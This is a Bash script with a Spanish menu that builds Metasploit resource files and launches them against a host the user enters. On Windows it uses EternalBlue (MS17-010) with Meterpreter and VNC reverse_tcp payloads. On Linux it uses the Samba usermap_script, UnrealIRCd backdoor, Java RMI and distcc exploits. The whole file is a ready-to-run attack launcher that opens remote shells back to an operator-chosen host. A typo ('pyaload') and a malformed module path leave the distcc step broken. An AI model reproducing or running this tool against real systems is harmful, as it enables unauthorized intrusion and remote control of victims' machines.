#! /bin/bash
clear
echo "......................................."
echo ". Bienvenido al Generador de exploits ."
echo "......................................."
echo ""
echo "Elija el Sistema Operativo:"
echo ""
echo "1- Windows."
echo "2- Linux."
echo "q- salir."
echo ""
read opcion

case $opcion in
1)
	clear
	echo "......................................"
	echo ". Generador de exploits para Windows ."
	echo "......................................"
	echo ""
	echo "--> VncInject."
	echo "--> Meterpreter."
	echo ""
	read -p "Host Remoto: " remote
	read -p "Host Local: " locale

	#Meterpreter para acceder por consola
	echo "use exploit/windows/smb/ms17_010_eternalblue" > /hacking/exploits/met-$remote.rc
	echo "set payload windows/x64/meterpreter/reverse_tcp" >> /hacking/exploits/met-$remote.rc
	echo set rhosts $remote >> /hacking/exploits/met-$remote.rc
	echo set lhost $locale >> /hacking/exploits/met-$remote.rc
	echo "exploit" >> /hacking/exploits/met-$remote.rc

	#Vnc para acceder de manera visual
	echo "use exploit/windows/smb/ms17_010_eternalblue" > /hacking/exploits/vnc-$remote.rc
	echo "set payload windows/x64/vncinject/reverse_tcp" >> /hacking/exploits/vnc-$remote.rc
	echo set rhosts $remote >> /hacking/exploits/vnc-$remote.rc
	echo set lhost $locale >> /hacking/exploits/vnc-$remote.rc
	echo "exploit" >> /hacking/exploits/vnc-$remote.rc

	clear
	echo "......................................"
	echo ". Generador de exploits para Windows ."
	echo "......................................"
	echo ""
	echo "Los exploits han sido generados satisfactoriamente en el directorio:"
	echo "/hacking/exploits/"
	echo "Meterpreter:  met-"$remote".rc"
	echo "VncInjecct:   vnc-"$remote".rc"
	echo ""
	echo "Elija una opcion:"
	echo ""
	echo "1- Ejecutar automaticamente (meterpreter)."
	echo "2- Ejecutar manualmente."
	echo "q- Salir."
	echo ""
	read op
	case $op in
	1)
	clear
	echo "Ejecutando meterpreter a la direccion: "$remote
	msfconsole -r /hacking/exploits/met-$remote.rc;;
	2) 
	clear
	echo "......................................"
	echo ". Generador de exploits para Windows ."
	echo "......................................"
	echo ""
	echo "Para ejecutar meterpreter: meterpreter "$remote 
	echo "Para ejecutar vnc viewer: vnc "$remote
	echo "*Presione una tecla para salir*"
	read
	exit;;
	q|Q)
 	exit;;
	*)
	echo "Hubo un error, reintente.";;
	esac;;

2)
	
clear
	echo "...................................."
	echo ". Generador de exploits para Linux ."
	echo "...................................."
	echo ""
	echo "--> Meterpreter."
	echo "Vulnerabilidades: SMB, UNREAL, JAVA."
	echo ""
	read -p "Host Remoto: " remote

	#Meterpreter para SMB:
	echo "use exploit/multi/samba/usermap_script" > /hacking/exploits/smb-$remote.rc
	echo set rhosts $remote >> /hacking/exploits/smb-$remote.rc
	echo "exploit" >> /hacking/exploits/smb-$remote.rc

	#Meterpreter para UNREAL:
	echo "use exploit/unix/irc/unreal_ircd_3281_backdoor" > /hacking/exploits/unreal-$remote.rc
	echo set rhosts $remote >> /hacking/exploits/unreal-$remote.rc
	echo "exploit" >> /hacking/exploits/unreal-$remote.rc

	#Meterpreter para RMI de Java:
	echo "use exploit/multi/misc/java_rmi_server " > /hacking/exploits/rmi-$remote.rc
	echo set rhosts $remote >> /hacking/exploits/rmi-$remote.rc
	echo "exploit" >> /hacking/exploits/rmi-$remote.rc

	#Meterpreter para DAEMON:
        echo "use exploit//unix/misc/distcc_exec" > /hacking/exploits/daemon-$remote.rc
	echo "set pyaload cmd/unix/bind_ruby" >> /hacking/exploits/daemon-$remote.rc
        echo set rhosts $remote >> /hacking/exploits/daemon-$remote.rc
        echo "exploit" >> /hacking/exploits/daemon-$remote.rc

	clear
	echo "......................................"
	echo ". Generador de exploits para Linux ."
	echo "......................................"
	echo ""
	echo "Los exploits han sido generados satisfactoriamente en el directorio:"
	echo "/hacking/exploits/"
	echo "Meterpreter para SMB:         smb-"$remote".rc"
	echo "Meterpreter para UNREAL:      unreal-"$remote".rc"
	echo "Meterpreter para RMI de Java: rmi-"$remote".rc"
	echo "Meterpreter no privilegiado DAEMON: daemon-"$remote".rc"
	echo ""
	echo "Elija una opcion:"
	echo ""
	echo "1- Ejecutar automaticamente (meterpreter)."
	echo "2- Ejecutar manualmente."
	echo "q- Salir."
	echo ""
	read ope
	case $ope in
	1)
	clear
	echo "...................................."
	echo ". Generador de exploits para Linux ."
	echo "...................................."
	echo ""
	echo "Elija la sesion de meterpreter que desea iniciar:"
	echo ""
	echo "1- SMB."
	echo "2- UNREAL."
	echo "3- RMI de JAVA."
	echo "q- Salir."
	echo ""
	read opi 
	case $opi in
		1)
		clear
		echo "Ejecutando meterpreter por SMB a la direccion: "$remote
		msfconsole -r /hacking/exploits/smb-$remote.rc;;

		2)
		clear
		echo "Ejecutando meterpreter por UNREAL a la direccion: "$remote
		msfconsole -r /hacking/exploits/unreal-$remote.rc;;

		3)
		clear
		echo "Ejecutando meterpreter por RMI de JAVA a la direccion: "$remote
		msfconsole -r /hacking/exploits/rmi-$remote.rc;;
		
		q|Q) exit;;
		*) 
		echo "Hubo un error, reintente.";;
		esac;;		 

	2) 
	clear
	echo "...................................."
	echo ". Generador de exploits para Linux ."
	echo "...................................."
	echo ""
	echo "Para ejecutar meterpreter por SMB: smb "$remote 
	echo "Para ejecutar meterpreter por UNREAL: unreal "$remote 
	echo "Para ejecutar meterpreter por RMI de JAVA: rmi "$remote
	echo "*Presione una tecla para salir*"
	read
	exit;;

	q|Q)
 	exit;;
	*)
	echo "Hubo un error, reintente.";;
	esac;;


q|Q) exit;;
*)
echo "Hubo un error, reintente.";;
esac
